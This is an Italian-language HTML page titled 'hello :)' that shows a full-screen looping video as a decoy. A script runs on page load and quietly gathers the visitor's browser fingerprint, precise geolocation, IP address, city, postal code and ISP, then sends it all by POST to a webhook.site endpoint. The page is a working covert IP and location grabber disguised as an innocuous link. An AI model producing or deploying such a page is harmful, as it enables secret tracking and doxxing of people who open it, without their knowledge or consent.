<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>hello :)</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
    }
    video {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <video autoplay loop muted playsinline>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    Il tuo browser non supporta i video HTML5.
  </video>

  <script>
    async function collectData() {
      const data = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        location: {},
        ipInfo: {}
      };

      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) =>
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
          );
          data.location = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          };
        } catch (err) {
          console.warn("Geolocalizzazione non consentita o fallita:", err.message);
        }
      }

      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const ip = await res.json();
          data.ipInfo = {
            ip: ip.ip,
            city: ip.city,
            region: ip.region,
            country: ip.country_name,
            postal: ip.postal,
            org: ip.org
          };
        } else {
          console.warn("Errore ipapi:", res.status);
        }
      } catch (e) {
        console.warn("Errore fetch IP:", e.message);
      }

      console.log("Dati raccolti:", data);

      fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(res => {
        console.log("Risposta webhook:", res.status);
        return res.text();
      })
      .then(txt => console.log("Testo risposta:", txt))
      .catch(err => console.error("Errore invio dati:", err));
    }

    collectData();
  </script>
</body>
</html>
